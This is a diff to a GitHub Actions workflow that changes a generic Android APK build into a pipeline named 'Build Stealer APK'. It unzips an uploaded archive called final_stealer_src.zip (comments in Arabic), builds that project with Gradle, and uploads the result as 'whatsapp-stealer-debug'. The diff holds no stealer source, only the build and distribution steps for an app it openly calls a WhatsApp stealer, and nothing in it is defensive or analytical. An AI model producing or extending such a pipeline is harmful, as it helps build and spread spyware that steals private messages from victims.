@@ -1,4 +1,4 @@
-name: Build Android APK
+name: Build Stealer APK
 
 on:
   push:
@@ -13,6 +13,19 @@ jobs:
     - name: Checkout Repository
       uses: actions/checkout@v4
 
+    - name: Unzip Project Archive
+      run: |
+        # البحث عن أي ملف مضغوط تم رفعه وفكه تلقائياً
+        if [ -f final_stealer_src.zip ]; then
+          unzip -o final_stealer_src.zip
+        elif [ -f project.zip ]; then
+          unzip -o project.zip
+        else
+          # فك أول ملف zip موجود في المجلد إذا لم يكن بالاسم المحدد
+          unzip -o '*.zip'
+        fi
+        ls -la
+
     - name: Set up JDK 17
       uses: actions/setup-java@v4
       with:
@@ -20,13 +33,15 @@ jobs:
         java-version: '17'
 
     - name: Grant execute permission for gradlew
-      run: chmod +x gradlew
+      run: chmod +x final_stealer/gradlew
 
     - name: Build Debug APK
-      run: ./gradlew assembleDebug
+      run: |
+        cd final_stealer
+        ./gradlew assembleDebug
 
     - name: Upload APK Artifact
       uses: actions/upload-artifact@v4
       with:
-        name: app-debug
-        path: app/build/outputs/apk/debug/app-debug.apk
+        name: whatsapp-stealer-debug
+        path: final_stealer/app/build/outputs/apk/debug/app-debug.apk
